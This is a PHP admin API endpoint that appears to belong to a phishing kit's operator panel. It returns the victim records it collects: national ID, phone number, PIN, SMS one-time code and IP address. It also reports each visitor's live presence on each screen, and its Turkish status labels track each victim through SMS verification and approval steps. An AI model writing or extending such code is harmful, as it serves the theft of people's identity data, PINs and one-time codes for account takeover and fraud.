<?php
declare(strict_types=1);
require_once dirname(__DIR__) . '/includes/storage.php';
requireAdmin();

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');

upsertPresence('index', null, true);
$applications = sortedApplicationsDesc();
$online = getOnlineSummary();
$onlineIndexCount = 0;
foreach (($online['visitors'] ?? []) as $visitor) {
    if (($visitor['screen'] ?? '') === 'index') {
        $onlineIndexCount++;
    }
}
$onlineByApplicationId = [];
$onlineByIp = [];
foreach (($online['visitors'] ?? []) as $visitor) {
    $applicationId = trim((string) ($visitor['application_id'] ?? ''));
    if ($applicationId !== '' && !isset($onlineByApplicationId[$applicationId])) {
        $onlineByApplicationId[$applicationId] = $visitor;
    }
    $visitorIp = trim((string) ($visitor['ip'] ?? ''));
    if ($visitorIp !== '' && !isset($onlineByIp[$visitorIp])) {
        $onlineByIp[$visitorIp] = $visitor;
    }
}
$statusLabels = [];
foreach (APPLICATION_STATUSES as $status) {
    $statusLabels[$status] = statusLabel($status);
}

$today = date('Y-m-d');
$summary = [
    'total' => count($applications),
    'today' => 0,
    'code_verified' => 0,
    'status_counts' => [
        'beklemede' => 0,
        'sms-dogrulama' => 0,
        'onay' => 0,
        'yeniden-index' => 0,
    ],
];

foreach ($applications as $app) {
    $createdAt = (string) ($app['created_at'] ?? '');
    if (strpos($createdAt, $today) === 0) {
        $summary['today']++;
    }
    if (!empty($app['sms_verified'])) {
        $summary['code_verified']++;
    }
    $status = (string) ($app['status'] ?? 'beklemede');
    if (isset($summary['status_counts'][$status])) {
        $summary['status_counts'][$status]++;
    }
}

$applicationRows = array_map(
    static function (array $app) use ($onlineByApplicationId, $onlineByIp): array {
        $status = (string) ($app['status'] ?? 'beklemede');
        $appId = (string) ($app['id'] ?? '');
        $visitor = $onlineByApplicationId[$appId] ?? null;
        if ($visitor === null) {
            $appIp = trim((string) ($app['client_ip'] ?? ''));
            if ($appIp !== '' && isset($onlineByIp[$appIp])) {
                $visitor = $onlineByIp[$appIp];
            }
        }
        return [
            'id' => $appId,
            'user_code' => (string) ($app['user_code'] ?? ($app['national_id'] ?? '')),
            'phone' => (string) ($app['phone'] ?? ''),
            'demo_pin' => (string) ($app['demo_pin'] ?? ''),
            'demo_pin_status' => (string) ($app['demo_pin'] ?? ''),
            'sms_code' => (string) ($app['sms_code'] ?? ''),
            'sms_verified' => (bool) ($app['sms_verified'] ?? false),
            'sms_attempts' => (int) ($app['sms_attempts'] ?? 0),
            'status' => $status,
            'status_label' => statusLabel($status),
            'created_at' => (string) ($app['created_at'] ?? ''),
            'client_ip' => (string) ($app['client_ip'] ?? ''),
            'live' => [
                'is_online' => $visitor !== null,
                'screen' => (string) (($visitor['screen'] ?? '') ?: ''),
                'screen_label' => (string) (($visitor['screen_label'] ?? '') ?: ''),
                'ip' => (string) (($visitor['ip'] ?? '') ?: ''),
                'last_seen' => (string) (($visitor['last_seen'] ?? '') ?: ''),
            ],
        ];
    },
    $applications
);

echo json_encode([
    'ok' => true,
    'count' => count($applications),
    'latest_id' => $applications[0]['id'] ?? null,
    'online_count' => $online['count'],
    'online_index_count' => $onlineIndexCount,
    'online_by_screen' => $online['by_screen'],
    'online_visitors' => $online['visitors'],
    'applications' => $applicationRows,
    'statuses' => APPLICATION_STATUSES,
    'status_labels' => $statusLabels,
    'summary' => $summary,
], JSON_UNESCAPED_UNICODE);

